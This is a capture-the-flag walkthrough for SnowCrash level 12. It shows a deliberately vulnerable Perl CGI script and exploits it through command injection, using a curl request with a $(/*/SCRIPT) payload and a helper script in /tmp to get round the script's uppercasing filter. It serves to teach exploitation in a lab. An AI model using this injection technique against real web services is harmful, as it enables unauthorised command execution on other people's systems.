# Security Vulnerability for Level12

Command injection - take the user's input without input checking or [escaping](https://www.hexnode.com/blogs/explained/what-is-output-escaping-in-cybersecurity/).

## Finding the Password for the `level13` User

### 1. Inspect `/home/user/level12` Directory

```bash
ls -l
total 4
-rwsr-sr-x+ 1 flag12 level12 464 Mar  5  2016 level12.pl
```
```bash
getfacl level12.pl 
# file: level12.pl
# owner: flag12
# group: level12
# flags: ss-
user::rwx
group::r-x
group:flag12:rwx		#effective:r-x
mask::r-x
other::r-x
```

### 2. Inspect `level12.pl` File

```bash
cat level12.pl
#!/usr/bin/env perl
# localhost:4646
use CGI qw{param};
print "Content-type: text/html\n\n";

sub t {
  $nn = $_[1];
  $xx = $_[0];
  $xx =~ tr/a-z/A-Z/;
  $xx =~ s/\s.*//;
  @output = `egrep "^$xx" /tmp/xd 2>&1`;
  foreach $line (@output) {
      ($f, $s) = split(/:/, $line);
      if($s =~ $nn) {
          return 1;
      }
  }
  return 0;
}

sub n {
  if($_[0] == 1) {
      print("..");
  } else {
      print(".");
  }    
}

n(t(param("x"), param("y")));
```

Transform letter to uppercase (john -> JOHN):
```pl
  $xx =~ tr/a-z/A-Z/;
```

Cut everything after first word separated with space:
```pl
  $xx =~ s/\s.*//;
```

Shell command that takes first param from request, modify it and inject it to the command:
```bash
  @output = `egrep "^$xx" /tmp/xd 2>&1`;
```
This can be exploited with command injection.

### 3. Check the Server on port 4646

Try to connect to localhost:4646
```bash
level12@SnowCrash:~$ telnet localhost 4646
Trying 127.0.0.1...
Connected to localhost.
Escape character is '^]'.
GET / HTTP/1.0

HTTP/1.1 200 OK
Date: Mon, 28 Sep 2026 12:37:44 GMT
Server: Apache/2.2.22 (Ubuntu)
Vary: Accept-Encoding
Connection: close
Content-Type: text/html

..Connection closed by foreign host.
```
The server is running on port 4646 and is responding to requests.

### 4. Inject a Command `getflag`

We see that only first param from request is injected in the shell command:
```bash
  @output = `egrep "^$xx" /tmp/xd 2>&1`;
```

It is transformed to uppercase so we can't just write `getflag` because it will become `GETFLAG`.
The solution is to use a file named in uppercase that contains `getflag` command.


Create file `/tmp/SCRIPT` so it is already uppercase, `/tmp` because it is the directory where user `level12` can write.

The file `/tmp/SCRIPT` contains:
```bash
#!/bin/bash
getflag > /tmp/any_name
```

Make it executable:
```bash
chmod +x /tmp/SCRIPT
```

Make a request via `curl`:
```bash
curl localhost:4646/?x='$(/*/SCRIPT)'
```
`*` in `$(/*/SCRIPT)` means any path.  
The single quotes so `$(/*/SCRIPT)` is not open before arriving to the `level12.pl` code. Otherwise, the file contents, shell command, is executed with `level12` user rights and we don't see the flag:
```bash
Check flag.Here is your token : 
Nope there is no token here for you sorry. Try again :)
```

Get the flag from the file `/tmp/any_name`:
```bash
cat /tmp/any_name
Check flag.Here is your token : xxxxx
```